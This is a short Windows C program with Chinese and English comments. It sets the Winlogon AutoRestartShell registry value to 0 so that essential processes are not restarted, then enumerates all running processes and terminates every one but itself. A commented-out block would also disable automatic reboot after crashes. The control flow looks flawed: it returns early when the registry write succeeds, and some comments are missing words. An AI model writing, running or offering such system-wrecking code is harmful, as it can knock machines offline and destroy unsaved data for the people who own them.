#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <processthreadsapi.h>
int main() {
	HKEY hKey;
    LONG lRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_ALL_ACCESS, &hKey);

    if (lRes == ERROR_SUCCESS)
    {
        // 将键值AutoRestartShell的数据设置为0，表示禁止系统自动重启必要的进程
        DWORD dwValue = 0;
        lRes = RegSetValueEx(hKey, "AutoRestartShell", 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(DWORD));
        RegCloseKey(hKey);

        if (lRes == ERROR_SUCCESS)
        {
            // 设置成功
            return 0;
        }
    }
    // Create a  of all processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return 1;

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // Get the first process in the 
    if (!Process32First(hSnapshot, &processEntry)) {
        CloseHandle(hSnapshot);
        return 1;
    }
 /*   HANDLE hKey1, hKey2;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\CrashControl"), 0, KEY_WRITE, &hKey1) == ERROR_SUCCESS)
    {
        if (RegCreateKeyEx(hKey1, _T("AutoReboot"), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey2, NULL) == ERROR_SUCCESS)
        {
            DWORD dwValue = 0;
            RegSetValueEx(hKey1, _T("AutoReboot"), 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(DWORD));
           RegCloseKey(hKey2);
        }
        RegCloseKey(hKey1);
    }
*/ 
    // Loop through all the processes in the 
    do {
        DWORD currentProcessID = GetCurrentProcessId();
        
        // Do not terminate the caller's own process
        if (processEntry.th32ProcessID != currentProcessID) {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processEntry.th32ProcessID);
            
            if (hProcess != NULL) {
                TerminateProcess(hProcess, 1);
                CloseHandle(hProcess);
            }
        }
    } while (Process32Next(hSnapshot, &processEntry));

    CloseHandle(hSnapshot);

    return 0;
}

